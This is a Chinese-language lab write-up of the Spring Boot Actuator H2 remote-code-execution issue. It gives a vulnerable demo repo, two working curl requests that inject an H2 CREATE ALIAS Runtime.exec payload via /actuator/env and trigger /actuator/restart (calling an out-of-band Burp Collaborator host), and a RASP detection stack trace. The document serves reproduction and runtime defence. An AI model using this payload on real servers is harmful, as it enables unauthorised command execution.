# SpringBoot Actuator H2


## 漏洞简介

Spring Boot框架是最流行的基于Java的微服务框架之一，可帮助开发人员快速轻松地部署Java应用程序，加快开发过程。当Spring Boot Actuator配置不当可能造成多种RCE，因为Spring Boot 2.x默认使用HikariCP数据库连接池，所以可通过H2数据库实现RCE。

## 漏洞复现

### 代码

[spring-boot-actuator-h2-rce](https://gitee.com/xl1605368195/spring-boot-actuator-h2-rce-public.git)

### 本地运行

`./mvnw package && java -jar target/gs-spring-boot-docker-0.1.0.jar`

### 攻击
+ step1 相应修改curl请求
```shell
curl -X 'POST' -H 'Content-Type: application/json' --data-binary $'{\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATE ALIAS EXEC AS CONCAT(\'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new\',\' java.util.Scanner(Runtime.getRun\',\'time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }\');CALL EXEC(\'curl http://x.burpcollaborator.net\');\"}' 'http://localhost:8080/actuator/env'
```
+ step2  重启actuator

```shell
curl -X 'POST' -H 'Content-Type: application/json' 'http://localhost:8080/actuator/restart'
```

## RASP防护

上面的请求重复发送
```json
{
  "cmdArray": ["curl", "http://x.burpcollaborator.net"],
  "stackTrace": [
    "java.lang.ProcessImpl.start(ProcessImpl.java)",
    "java.lang.ProcessBuilder.start(ProcessBuilder.java:1029)",
    "java.lang.Runtime.exec(Runtime.java:621)",
    "java.lang.Runtime.exec(Runtime.java:451)",
    "java.lang.Runtime.exec(Runtime.java:348)",
    "org.h2.dynamic.EXEC.shellexec(EXEC.java:6)",
    "sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)",
    "sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)",
    "sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)",
    "java.lang.reflect.Method.invoke(Method.java:498)",
    "org.h2.engine.FunctionAlias$JavaMethod.getValue(FunctionAlias.java:441)",
    "org.h2.expression.function.JavaFunction.getValue(JavaFunction.java:40)",
    "org.h2.command.dml.Call.query(Call.java:65)",
    "org.h2.command.CommandContainer.query(CommandContainer.java:285)",
    "org.h2.command.CommandList.executeRemaining(CommandList.java:57)",
    "org.h2.command.CommandList.update(CommandList.java:67)",
    "org.h2.command.Command.executeUpdate(Command.java:251)",
    "org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:228)",
    "org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:201)",
    "com.zaxxer.hikari.pool.PoolBase.executeSql(PoolBase.java:569)",
    "com.zaxxer.hikari.pool.PoolBase.checkValidationSupport(PoolBase.java:453)",
    "com.zaxxer.hikari.pool.PoolBase.checkDriverSupport(PoolBase.java:433)",
    "com.zaxxer.hikari.pool.PoolBase.setupConnection(PoolBase.java:402)",
    "com.zaxxer.hikari.pool.PoolBase.newConnection(PoolBase.java:355)",
    "com.zaxxer.hikari.pool.PoolBase.newPoolEntry(PoolBase.java:201)",
    "com.zaxxer.hikari.pool.HikariPool.createPoolEntry(HikariPool.java:473)",
    "com.zaxxer.hikari.pool.HikariPool.checkFailFast(HikariPool.java:562)",
    "com.zaxxer.hikari.pool.HikariPool.<init>(HikariPool.java:115)",
    "com.zaxxer.hikari.HikariDataSource.getConnection(HikariDataSource.java:112)",
    "com.zaxxer.hikari.HikariDataSource$$FastClassBySpringCGLIB$$eeb1ae86.invoke(<generated>)",
    "org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218)",
    "org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:769)",
    "org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163)",
    "org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747)",
    "org.springframework.aop.support.DelegatingIntroductionInterceptor.doProceed(DelegatingIntroductionInterceptor.java:136)",
    "org.springframework.aop.support.DelegatingIntroductionInterceptor.invoke(DelegatingIntroductionInterceptor.java:124)",
    "org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186)",
    "org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747)",
    "org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:689)",
    "com.zaxxer.hikari.HikariDataSource$$EnhancerBySpringCGLIB$$ff3b4cc4.getConnection(<generated>)",
    "org.springframework.jdbc.datasource.DataSourceUtils.fetchConnection(DataSourceUtils.java:158)",
    "org.springframework.jdbc.datasource.DataSourceUtils.doGetConnection(DataSourceUtils.java:116)",
    "org.springframework.jdbc.datasource.DataSourceUtils.getConnection(DataSourceUtils.java:79)",
    "org.springframework.jdbc.core.JdbcTemplate.execute(JdbcTemplate.java:324)",
    "org.springframework.boot.jdbc.EmbeddedDatabaseConnection.isEmbedded(EmbeddedDatabaseConnection.java:120)",
    "org.springframework.boot.autoconfigure.orm.jpa.HibernateDefaultDdlAutoProvider.getDefaultDdlAuto(HibernateDefaultDdlAutoProvider.java:42)",
    "org.springframework.boot.autoconfigure.orm.jpa.HibernateJpaConfiguration.lambda$getVendorProperties$1(HibernateJpaConfiguration.java:130)",
    "org.springframework.boot.autoconfigure.orm.jpa.HibernateSettings.getDdlAuto(HibernateSettings.java:41)",
    "org.springframework.boot.autoconfigure.orm.jpa.HibernateProperties.determineDdlAuto(HibernateProperties.java:136)",
    "org.springframework.boot.autoconfigure.orm.jpa.HibernateProperties.getAdditionalProperties(HibernateProperties.java:102)",
    "org.springframework.boot.autoconfigure.orm.jpa.HibernateProperties.determineHibernateProperties(HibernateProperties.java:94)",
    "org.springframework.boot.autoconfigure.orm.jpa.HibernateJpaConfiguration.getVendorProperties(HibernateJpaConfiguration.java:132)",
    "org.springframework.boot.autoconfigure.orm.jpa.JpaBaseConfiguration.entityManagerFactory(JpaBaseConfiguration.java:133)",
    "sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)",
    "sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)",
    "sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)",
    "java.lang.reflect.Method.invoke(Method.java:498)",
    "org.springframework.beans.factory.support.SimpleInstantiationStrategy.instantiate(SimpleInstantiationStrategy.java:154)",
    "org.springframework.beans.factory.support.ConstructorResolver.instantiate(ConstructorResolver.java:640)",
    "org.springframework.beans.factory.support.ConstructorResolver.instantiateUsingFactoryMethod(ConstructorResolver.java:625)",
    "org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.instantiateUsingFactoryMethod(AbstractAutowireCapableBeanFactory.java:1338)",
    "org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1177)",
    "org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:557)",
    "org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:517)",
    "org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:323)",
    "org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222)",
    "org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:321)",
    "org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:202)",
    "org.springframework.context.support.AbstractApplicationContext.getBean(AbstractApplicationContext.java:1108)",
    "org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:868)",
    "org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:550)",
    "org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.refresh(ServletWebServerApplicationContext.java:141)",
    "org.springframework.boot.SpringApplication.refresh(SpringApplication.java:747)",
    "org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:397)",
    "org.springframework.boot.SpringApplication.run(SpringApplication.java:315)",
    "org.springframework.cloud.context.restart.RestartEndpoint.doRestart(RestartEndpoint.java:133)",
    "org.springframework.cloud.context.restart.RestartEndpoint.safeRestart(RestartEndpoint.java:99)",
    "java.lang.Thread.run(Thread.java:748)"
  ]
}
```

存在的问题：http 请求丢失
